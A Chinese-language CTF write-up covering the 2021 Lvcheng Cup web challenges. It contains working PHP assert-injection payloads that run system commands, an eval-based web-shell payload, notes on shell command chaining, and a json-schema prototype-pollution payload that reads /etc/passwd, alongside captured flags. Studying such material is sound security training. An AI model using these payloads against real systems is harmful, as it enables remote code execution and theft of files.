---
title: 绿城杯Web部分WP
date: 2021-09-29 19:14:13
tags:  CTF,比赛
category: CTF
---

## ezphp

- 收获：rce，代码执行

  - ⭕通过代码执行或命令执行写Shell：https://www.bilibili.com/read/cv11569998

  - https://blog.csdn.net/qq_46150940/article/details/110044575

- 差不多原题：https://blog.csdn.net/About23/article/details/95075416 、https://www.jianshu.com/p/47bbfaf3f2d9

### 知识点

- php运算符及优先级：https://www.php.net/manual/zh/language.operators.logical.php

-  bool or bool这样的语句中，如果前一个值为真后一个值就不会再判断了

- assert assert ( mixed $assertion [, Throwable $exception ] ) : bool——— assert — 检查一个断言是否为 FALSE，如果是false，返回1，否则返回0 
  - 如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行

- strpos 如果没找到 needle，将返回 false。

### 解题

- assert($safe_check1) or die("no no no!");
  - 只有assert为真才不会die，assert参数为false才返回1。符合假定则就不会die

- 所以只要闭合assert右括号，并注释掉die即可
  - assert(" strpos('pages/flag','..')||phpinfo();//.php  ', '..') === false   ")

- 输入')||phpinfo();//，代码执行，显示phpinfo=》命令执行

#### 解法1：在源码里！！php会被执行！

- index.php跟pages文件夹在同一目录下，注意加上./!，下面的都可以！

  - ')||system('cat ./pages/flag.php');//

  - 1','1')||system('cat ./pages/flag.php');//

  - flag','.')||system('cat pages/flag.php');//

  - ')||eval("system('cat ./pages/flag.php');");//

  - ')||print_r(file_get_contents('./pages/flag.php'));//

- url：view-source:http://e6e8c804-8ce5-4caa-9940-411be14f96fb.zzctf.dasctf.com/?link_page=1%27,%271%27)||system(%27cat%20./pages/flag.php%27);//![](https://api2.mubu.com/v3/document_image/756e8572-0051-4ab5-86f6-a50f4ad45031-11812322.jpg)![](https://api2.mubu.com/v3/document_image/47729fa1-eb75-44e3-a60b-788116c9f2b4-11812322.jpg)

- flag找到//DASCTF{c804c562fffd14c6ae757e07b30126ee}

#### 解法2

也可用蚁剑?link_page=flag.php', '..') === true|eval($_POST['yy']);//，post传参yy=system('ls /');，密码yy

- 在Linux上， ; 可以用 |、|| 代替

  - ;前面的执行完执行后面的 

  - |是管道符，显示后面的执行结果 

  - ||当前面的执行出错时执行后面的 

- 在Windows上，不能用 ; 可以用&、&&、|、||代替

  - &前面的语句为假则直接执行后面的

  - &&前面的语句为假则直接出错，后面的也不执行 

  - |直接执行后面的语句

  - ||前面出错执行后面的

## easyjava

- wp：https://ha1c9on.top/2021/09/29/2021-lvcvheng-ezjava/

- wp2：https://www.wolai.com/atao/i6PwXQdpbcwBeXvJVLrjMr

## easycms 

- http://240ecfdd-1600-46bb-99cc-c5c21cc46f55.zzctf.dasctf.com/

- wp
  - https://guokeya.github.io/post/8ZEuy4BXz/

## Looking for treasure

- 考点：源码审计、json-schema原型链污染

- wp：https://blog.csdn.net/weixin_52091458/article/details/120560406

- js知识点

  - let命令，用来声明局部变量，类似于var，但var是全局变量，let是花括号内局部变量

  - console.log()，输出括号里的东西

  - req.body是用在post请求当中得到请求体

  - lodash是java的原生库，里面有很多方法（函数）可以用

  - object.toString()，以字符串的形式返回对象内容

  - JSON.parse() 方法将数据转换为 JavaScript 对象。

  - [Express中 res.json及res.send()](https://juejin.cn/post/6844903920976789511)，都是发送内容到http响应body里，但可能因类型不同导致Content-Type 不同

  - 获取url参数：/path/:id,参数在req.params.id中，/path?id=xx,参数在req.query.id中，：表示后面的是参数

  - 逻辑非运算符! >逻辑或运算符||，先非后或，或只要前面是true则不会执行后面

  - JSON Schema本身是是JSON数据的规范/模板，是一种数据结构

  - ⭕原型链污染

    - https://www.cnblogs.com/l0nmar/p/13951739.html

    - Defcon CTF Final Web wp（部分原题）：[https://0day.design/2020/08/11/defcon%20CTF%20Final%20Web%20WriteUp/](https://0day.design/2020/08/11/defcon CTF Final Web WriteUp/)

    - 知识库，少：https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html

    - freebuf https://www.freebuf.com/articles/web/264966.html

### 解题

- fs.readFileSync()方法是fs模块的内置应用程序编程接口，用于读取文件并返回其内容。

  - 这里读取了p文件，如果能控制p的值就能实现文件读取。

    

    - lodash.isEqual(req.body, content)，检查post的body是否与读取的文件内容相同，这个肯定是不相同的不用管它 ，所以p的内容最后会在报错信息的content里发出，以这种形式res.send({ "validator": valid, "content" : content, "log": "wrong content"})

  - p怎么来的，config.path给p赋值。所以得想办法控制path的值。![](https://api2.mubu.com/v3/document_image/c13adcb2-dab3-4d12-8452-fb2f1c7025e5-11812322.jpg)

  - 一开始url无参数，!req.params.library为true，直接req.params.library = "json-schema";

  - 看到这个想到json-schema原型链污染

- payload

  - {"$schema":{"type":"object","properties":{"__proto__":{"type":"object","properties":{"path":{"type":"string","default":"/etc/passwd"}}}}}}
    - default后面的字符串可控![](https://api2.mubu.com/v3/document_image/5c821c1d-dd7e-470f-b7d3-514c870dea79-11812322.jpg)

  - DASCTF{5117143e660f592adc982dd96d2c3f17}